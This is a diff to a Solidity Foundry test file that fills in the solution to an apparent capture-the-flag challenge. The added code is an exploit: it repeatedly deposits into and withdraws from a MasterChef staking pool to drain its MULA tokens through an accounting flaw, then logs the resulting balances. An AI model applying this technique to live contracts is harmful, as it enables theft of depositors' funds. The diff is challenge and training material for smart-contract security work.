@@ -69,7 +69,31 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        mula.approve(address(masterChef), type(uint256).max);
+
+        uint256 attackAmount = mula.balanceOf(attacker);
+
+        while (true) {
+            masterChef.deposit({_pid: 0, _amount: attackAmount});
+
+            uint256 masterChefAmount = mula.balanceOf(address(masterChef)) - 1;
+
+            if (masterChefAmount < attackAmount) {
+                masterChef.withdraw({_pid: 0, _amount: masterChefAmount});
+                break;
+            } else {
+                masterChef.withdraw({_pid: 0, _amount: attackAmount});
+            }
+
+            attackAmount -= attackAmount * 5 / 100;
+        }
+
+        console.log("MULA in MasterChef", mula.balanceOf(address(masterChef)));
+        console.log("MUNY in MasterChef", muny.balanceOf(address(masterChef)));
+        (uint256 amountUser,) = masterChef.userInfo(0, adminUser);
+        (uint256 amountAttacker,) = masterChef.userInfo(0, attacker);
+        console.log("MULA MasterChef associates to adminUser", amountUser);
+        console.log("MULA MasterChef associates to attacker ", amountAttacker);
 
         vm.stopPrank();
         validation();
